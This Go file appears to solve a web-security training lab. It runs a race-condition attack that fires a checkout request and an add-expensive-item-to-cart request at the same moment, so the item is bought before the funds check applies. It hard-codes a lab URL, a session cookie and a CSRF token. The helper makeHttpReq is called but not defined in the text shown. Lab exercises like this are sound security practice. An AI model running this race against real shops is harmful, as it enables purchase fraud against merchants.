package main

import (
	"net/http"
	"sync"
)

var (
	main_url       = "https://0a1d00340356d0e98278cedf00f400e5.web-security-academy.net" // should NOT end with "/"
	session_cookie = "iTbdGhW92kOpGI96u0SWY85cUaLphzDQ"

	http_client = http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
)

// before start make sure you have an item that you can buy in your cart
func main() {
	var wg sync.WaitGroup
	wg.Add(2)

	// get a home page: a connection warm up request
	makeHttpReq(http.MethodPost, main_url, "")

	go placeTheOrder(&wg)
	go addAnExpensiveItemToTheCart(&wg)

	wg.Wait()
}

func addAnExpensiveItemToTheCart(wg *sync.WaitGroup) {
	defer wg.Done()

	makeHttpReq(http.MethodPost, main_url+"/cart", "productId=1&redir=PRODUCT&quantity=1")
}

// it first checks if user has enough money and then it buys the products
func placeTheOrder(wg *sync.WaitGroup) {
	defer wg.Done()

	makeHttpReq(http.MethodPost, main_url+"/cart/checkout", "csrf=7jYqkEt2bDEMwSER0En4Su28u2h7eYHD")
}
